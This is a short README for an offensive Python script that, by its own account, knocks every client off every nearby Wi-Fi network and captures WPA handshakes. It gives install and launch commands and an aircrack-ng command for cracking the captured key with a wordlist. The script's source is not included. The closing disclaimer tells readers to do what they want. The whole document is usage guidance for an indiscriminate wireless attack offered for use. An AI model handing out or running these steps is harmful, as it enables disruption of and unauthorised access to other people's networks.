# Mass deauth
<br>
This script deauth everyone on every wifi around you & grab password hash !
<br><br>

## USAGE

First install the requirements :

```
pip3 install -r requirements.txt

```
Now you can launch the script !

```
python3 heheheha.py {YOUR_WIFI_INTERFACE} {YOUR_MONITOR_WIFI_INTERFACE}
```

or 

```
python3 heheheha.py
```
[use wlan0 on both interface]
<br><br>
exemple:
<br>

```
python3 heheheha.py wlan0 wlan0
```

<br>
The file who contain the Handshake is on the current directory, for crack the key make a aircrack command with your fav wordlist :
<br>

```
aircrack-ng the_output_name.cap -w /home/root/wordlist/your_wordlist.txt
```

<br><br>
**Just for educational purpose only, Do, what you want I don’t give a fuck, but it’s not my fault you’re in trouble.** 

